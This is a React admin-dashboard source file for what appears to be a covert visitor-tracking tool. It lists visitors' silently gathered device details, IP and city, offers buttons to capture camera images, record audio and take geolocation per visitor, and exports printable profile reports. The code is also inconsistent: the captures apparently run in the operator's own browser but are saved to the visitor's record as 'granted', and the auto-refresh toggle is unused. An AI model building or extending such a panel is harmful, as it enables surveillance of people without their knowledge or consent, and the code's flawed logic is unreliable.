import { useState, useEffect } from 'react';
import { collection, getDocs, deleteDoc, doc, updateDoc } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { captureFrontCamera, captureBackCamera, captureMicrophone, getGeolocation } from '../lib/deviceCollector';

interface AdminDashboardProps {
  onLogout: () => void;
}

export default function AdminDashboard({ onLogout }: AdminDashboardProps) {
  const [visitors, setVisitors] = useState<any[]>([]);
  const [selectedVisitor, setSelectedVisitor] = useState<any | null>(null);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [cameraModal, setCameraModal] = useState<{type: 'front'|'back'|null; data: string|null}>({type: null, data: null});
  const [micRecording, setMicRecording] = useState(false);
  const [micAudio, setMicAudio] = useState<Blob|null>(null);
  const [locationModal, setLocationModal] = useState<{lat: number; lng: number}|null>(null);

  useEffect(() => {
    loadVisitors();
    const interval = setInterval(loadVisitors, 3000);
    return () => clearInterval(interval);
  }, []);

  async function loadVisitors() {
    try {
      const visitorRef = collection(db, 'visitors');
      const snapshot = await getDocs(visitorRef);
      const visitorList = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      }));
      setVisitors(visitorList);
    } catch (error) {
      console.error('Error loading visitors:', error);
    }
    setLoading(false);
  }

  async function deleteVisitor(visitorId: string) {
    try {
      await deleteDoc(doc(db, 'visitors', visitorId));
      setVisitors(visitors.filter(v => v.id !== visitorId));
      if (selectedVisitor?.id === visitorId) {
        setSelectedVisitor(null);
      }
    } catch (error) {
      console.error('Error deleting visitor:', error);
    }
  }

  async function captureFrontCameraForUser(visitorId: string) {
    try {
      const result = await captureFrontCamera();
      if (result) {
        setCameraModal({ type: 'front', data: result.screenshot });

        const docRef = doc(db, 'visitors', visitorId);
        await updateDoc(docRef, {
          'permissionFeatures.frontCamera': 'granted',
          'media.frontCameraScreenshot': result.screenshot
        });
      }
    } catch (e) {
      alert('Camera access denied');
    }
  }

  async function captureBackCameraForUser(visitorId: string) {
    try {
      const result = await captureBackCamera();
      if (result) {
        setCameraModal({ type: 'back', data: result.screenshot });

        const docRef = doc(db, 'visitors', visitorId);
        await updateDoc(docRef, {
          'permissionFeatures.backCamera': 'granted',
          'media.backCameraScreenshot': result.screenshot
        });
      }
    } catch (e) {
      alert('Camera access denied');
    }
  }

  async function captureMicForUser(visitorId: string) {
    try {
      if (micRecording) {
        setMicRecording(false);
        return;
      }

      setMicRecording(true);
      const result = await captureMicrophone();

      if (result) {
        setMicAudio(result.audio);
        setMicRecording(false);

        const docRef = doc(db, 'visitors', visitorId);
        await updateDoc(docRef, {
          'permissionFeatures.microphone': 'granted'
        });

        alert('Audio recorded successfully! Duration: 3 seconds');
      }
    } catch (e) {
      setMicRecording(false);
      alert('Microphone access denied');
    }
  }

  async function captureLocationForUser(visitorId: string) {
    try {
      const result = await getGeolocation();
      if (result) {
        setLocationModal({ lat: result.position.coords.latitude, lng: result.position.coords.longitude });

        const docRef = doc(db, 'visitors', visitorId);
        await updateDoc(docRef, {
          'permissionFeatures.locationLat': result.position.coords.latitude,
          'permissionFeatures.locationLong': result.position.coords.longitude,
          'permissionFeatures.locationAccuracy': result.position.coords.accuracy
        });
      }
    } catch (e) {
      alert('Location access denied');
    }
  }

  function exportToPDF(visitor: any) {
    const silent = visitor.silentFeatures || {};

    const reportContent = `
      <div style="font-family: Arial, sans-serif; padding: 40px; max-width: 800px; margin: 0 auto;">
        <div style="background: #667eea; color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px;">
          <h1 style="margin: 0 0 10px 0;">User Report</h1>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Device:</strong> ${silent.deviceModel || 'N/A'}</p>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Location:</strong> ${silent.countryCity || 'N/A'}</p>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Generated:</strong> ${new Date().toLocaleString()}</p>
        </div>

        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
          <h2 style="color: #667eea; margin-top: 0;">Device Information</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Device Model:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.deviceModel || 'N/A'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>OS:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.osVersion || 'N/A'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Browser:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.browser || 'N/A'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>RAM:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.deviceMemory || 0} GB</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>CPU Cores:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.cpuCores || 'N/A'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Battery:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${silent.batteryLevel ? silent.batteryLevel + '%' : 'N/A'}</td></tr>
          </table>
        </div>

        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
          <h2 style="color: #667eea; margin-top: 0;">Location</h2>
          <p><strong>IP:</strong> ${silent.ipAddress || 'N/A'}</p>
          <p><strong>Country/City:</strong> ${silent.countryCity || 'N/A'}</p>
          <p><strong>Timezone:</strong> ${silent.timezone || 'N/A'}</p>
        </div>

        <p style="text-align: center; color: #999; font-size: 12px; margin-top: 40px;">
          Report generated on ${new Date().toLocaleString()}
        </p>
      </div>
    `;

    const printWindow = window.open('', '_blank');
    if (!printWindow) return;

    printWindow.document.write(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>User Report</title>
      </head>
      <body>
        ${reportContent}
        <script>window.onload = function() { window.print(); }</script>
      </body>
      </html>
    `);
    printWindow.document.close();
  }

  const filteredVisitors = visitors.filter(v =>
    v.deviceId?.toLowerCase().includes(filter.toLowerCase()) ||
    v.silentFeatures?.ipAddress?.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f5f7fa',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <div style={{
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px 40px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
      }}>
        <div>
          <h1 style={{ color: 'white', fontSize: '24px', margin: 0 }}>
            Admin Dashboard
          </h1>
          <p style={{ color: 'rgba(255,255,255,0.8)', margin: '5px 0 0 0', fontSize: '14px' }}>
            {filteredVisitors.length} total users
          </p>
        </div>
        <button onClick={onLogout} style={{
          background: 'white',
          color: '#667eea',
          border: 'none',
          padding: '10px 25px',
          borderRadius: '8px',
          cursor: 'pointer',
          fontWeight: '600',
          fontSize: '14px'
        }}>
          Logout
        </button>
      </div>

      <div style={{ padding: '30px 40px' }}>
        <div style={{
          background: 'white',
          borderRadius: '12px',
          padding: '20px',
          marginBottom: '20px',
          display: 'flex',
          gap: '15px',
          alignItems: 'center',
          boxShadow: '0 2px 10px rgba(0,0,0,0.05)'
        }}>
          <input
            type="text"
            placeholder="Search by Device ID or IP..."
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            style={{
              flex: 1,
              padding: '12px 20px',
              border: '2px solid #e0e0e0',
              borderRadius: '8px',
              fontSize: '14px',
              outline: 'none'
            }}
          />
          <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
              style={{ width: '18px', height: '18px', cursor: 'pointer' }}
            />
            <span style={{ fontSize: '14px', color: '#666' }}>Auto Refresh</span>
          </label>
          <button onClick={loadVisitors} style={{
            background: '#667eea',
            color: 'white',
            border: 'none',
            padding: '12px 25px',
            borderRadius: '8px',
            cursor: 'pointer',
            fontWeight: '600',
            fontSize: '14px'
          }}>
            Refresh
          </button>
        </div>

        {loading ? (
          <div style={{ textAlign: 'center', padding: '60px', color: '#999' }}>
            Loading...
          </div>
        ) : (
          <div style={{ display: 'grid', gridTemplateColumns: '350px 1fr', gap: '20px', minHeight: '70vh' }}>
            <div style={{
              background: 'white',
              borderRadius: '12px',
              overflow: 'hidden',
              boxShadow: '0 2px 10px rgba(0,0,0,0.05)'
            }}>
              <div style={{
                padding: '15px 20px',
                borderBottom: '2px solid #f0f0f0',
                fontWeight: '600',
                color: '#333'
              }}>
                Users List
              </div>
              <div style={{ maxHeight: 'calc(70vh - 60px)', overflowY: 'auto' }}>
                {filteredVisitors.length === 0 ? (
                  <div style={{ padding: '40px', textAlign: 'center', color: '#999' }}>
                    No users found
                  </div>
                ) : (
                  filteredVisitors.map((visitor) => (
                    <div
                      key={visitor.id}
                      onClick={() => setSelectedVisitor(visitor)}
                      style={{
                        padding: '15px 20px',
                        borderBottom: '1px solid #f0f0f0',
                        cursor: 'pointer',
                        background: selectedVisitor?.id === visitor.id ? '#f0f3ff' : 'white',
                        transition: 'background 0.2s'
                      }}
                    >
                      <div style={{ fontSize: '14px', fontWeight: '600', color: '#333', marginBottom: '5px' }}>
                        {visitor.silentFeatures?.deviceModel || 'Unknown Device'}
                      </div>
                      <div style={{ fontSize: '12px', color: '#999' }}>
                        {visitor.silentFeatures?.ipAddress || 'No IP'}
                      </div>
                      <div style={{ fontSize: '11px', color: '#667eea', marginTop: '5px' }}>
                        {visitor.silentFeatures?.countryCity || 'Unknown'}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>

            <div style={{
              background: 'white',
              borderRadius: '12px',
              padding: '30px',
              boxShadow: '0 2px 10px rgba(0,0,0,0.05)',
              overflowY: 'auto',
              maxHeight: '70vh'
            }}>
              {!selectedVisitor ? (
                <div style={{ textAlign: 'center', padding: '60px', color: '#999' }}>
                  Select a user to view details
                </div>
              ) : (
                <div>
                  <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    marginBottom: '25px',
                    paddingBottom: '15px',
                    borderBottom: '2px solid #f0f0f0'
                  }}>
                    <h2 style={{ margin: 0, fontSize: '22px', color: '#333' }}>
                      {selectedVisitor.silentFeatures?.deviceModel || 'User Details'}
                    </h2>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button onClick={() => exportToPDF(selectedVisitor)} style={{
                        background: '#667eea',
                        color: 'white',
                        border: 'none',
                        padding: '10px 15px',
                        borderRadius: '8px',
                        cursor: 'pointer',
                        fontWeight: '600',
                        fontSize: '12px'
                      }}>
                        Export PDF
                      </button>
                      <button onClick={() => deleteVisitor(selectedVisitor.id)} style={{
                        background: '#f44336',
                        color: 'white',
                        border: 'none',
                        padding: '10px 15px',
                        borderRadius: '8px',
                        cursor: 'pointer',
                        fontWeight: '600',
                        fontSize: '12px'
                      }}>
                        Delete
                      </button>
                    </div>
                  </div>

                  <div style={{
                    background: '#f8f9fa',
                    borderRadius: '8px',
                    padding: '20px',
                    marginBottom: '20px'
                  }}>
                    <h3 style={{ margin: '0 0 15px 0', fontSize: '16px', color: '#667eea' }}>📷 Camera</h3>
                    <div style={{ display: 'flex', gap: '10px', marginBottom: '15px' }}>
                      <button onClick={() => captureFrontCameraForUser(selectedVisitor.id)} style={{
                        background: '#4CAF50',
                        color: 'white',
                        border: 'none',
                        padding: '10px 20px',
                        borderRadius: '8px',
                        cursor: 'pointer',
                        fontWeight: '600',
                        fontSize: '14px'
                      }}>
                        Capture Front Camera
                      </button>
                      <button onClick={() => captureBackCameraForUser(selectedVisitor.id)} style={{
                        background: '#4CAF50',
                        color: 'white',
                        border: 'none',
                        padding: '10px 20px',
                        borderRadius: '8px',
                        cursor: 'pointer',
                        fontWeight: '600',
                        fontSize: '14px'
                      }}>
                        Capture Back Camera
                      </button>
                    </div>
                    {cameraModal.data && (
                      <div style={{ marginTop: '15px' }}>
                        <p style={{ fontSize: '13px', color: '#666', margin: '0 0 10px 0' }}>Preview ({cameraModal.type} camera):</p>
                        <img src={cameraModal.data} style={{ maxWidth: '100%', borderRadius: '8px', maxHeight: '200px' }} />
                      </div>
                    )}
                  </div>

                  <div style={{
                    background: '#f8f9fa',
                    borderRadius: '8px',
                    padding: '20px',
                    marginBottom: '20px'
                  }}>
                    <h3 style={{ margin: '0 0 15px 0', fontSize: '16px', color: '#667eea' }}>🎤 Microphone</h3>
                    <button onClick={() => captureMicForUser(selectedVisitor.id)} style={{
                      background: micRecording ? '#f44336' : '#4CAF50',
                      color: 'white',
                      border: 'none',
                      padding: '10px 20px',
                      borderRadius: '8px',
                      cursor: 'pointer',
                      fontWeight: '600',
                      fontSize: '14px'
                    }}>
                      {micRecording ? '🔴 Recording... (3 sec)' : 'Record Audio (3 sec)'}
                    </button>
                    {micAudio && (
                      <div style={{ marginTop: '15px' }}>
                        <p style={{ fontSize: '13px', color: '#666', margin: '0 0 10px 0' }}>Audio Recording:</p>
                        <audio controls style={{ maxWidth: '100%' }}>
                          <source src={URL.createObjectURL(micAudio)} type="audio/webm" />
                        </audio>
                      </div>
                    )}
                  </div>

                  <div style={{
                    background: '#f8f9fa',
                    borderRadius: '8px',
                    padding: '20px',
                    marginBottom: '20px'
                  }}>
                    <h3 style={{ margin: '0 0 15px 0', fontSize: '16px', color: '#667eea' }}>📍 Location</h3>
                    <button onClick={() => captureLocationForUser(selectedVisitor.id)} style={{
                      background: '#4CAF50',
                      color: 'white',
                      border: 'none',
                      padding: '10px 20px',
                      borderRadius: '8px',
                      cursor: 'pointer',
                      fontWeight: '600',
                      fontSize: '14px',
                      marginBottom: '15px'
                    }}>
                      Get Location
                    </button>
                    {locationModal && (
                      <div>
                        <p style={{ fontSize: '13px', color: '#333', margin: '0 0 8px 0' }}>
                          <strong>Latitude:</strong> {locationModal.lat.toFixed(6)}
                        </p>
                        <p style={{ fontSize: '13px', color: '#333', margin: '0 0 8px 0' }}>
                          <strong>Longitude:</strong> {locationModal.lng.toFixed(6)}
                        </p>
                        <a href={`https://www.google.com/maps/search/${locationModal.lat},${locationModal.lng}`} target="_blank" rel="noopener noreferrer" style={{
                          display: 'inline-block',
                          background: '#2196F3',
                          color: 'white',
                          padding: '8px 15px',
                          borderRadius: '6px',
                          textDecoration: 'none',
                          fontSize: '13px',
                          fontWeight: '600',
                          marginTop: '10px'
                        }}>
                          Open in Google Maps
                        </a>
                      </div>
                    )}
                  </div>

                  <div style={{
                    background: '#f8f9fa',
                    borderRadius: '8px',
                    padding: '20px',
                    marginBottom: '20px'
                  }}>
                    <h3 style={{ margin: '0 0 15px 0', fontSize: '16px', color: '#667eea' }}>Device Info</h3>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', fontSize: '14px' }}>
                      <div><strong>Model:</strong> {selectedVisitor.silentFeatures?.deviceModel || 'N/A'}</div>
                      <div><strong>OS:</strong> {selectedVisitor.silentFeatures?.osVersion || 'N/A'}</div>
                      <div><strong>Browser:</strong> {selectedVisitor.silentFeatures?.browser || 'N/A'}</div>
                      <div><strong>IP:</strong> {selectedVisitor.silentFeatures?.ipAddress || 'N/A'}</div>
                      <div><strong>Location:</strong> {selectedVisitor.silentFeatures?.countryCity || 'N/A'}</div>
                      <div><strong>Battery:</strong> {selectedVisitor.silentFeatures?.batteryLevel ? selectedVisitor.silentFeatures.batteryLevel + '%' : 'N/A'}</div>
                      <div><strong>RAM:</strong> {selectedVisitor.silentFeatures?.deviceMemory || 0} GB</div>
                      <div><strong>CPU:</strong> {selectedVisitor.silentFeatures?.cpuCores || 'N/A'} cores</div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
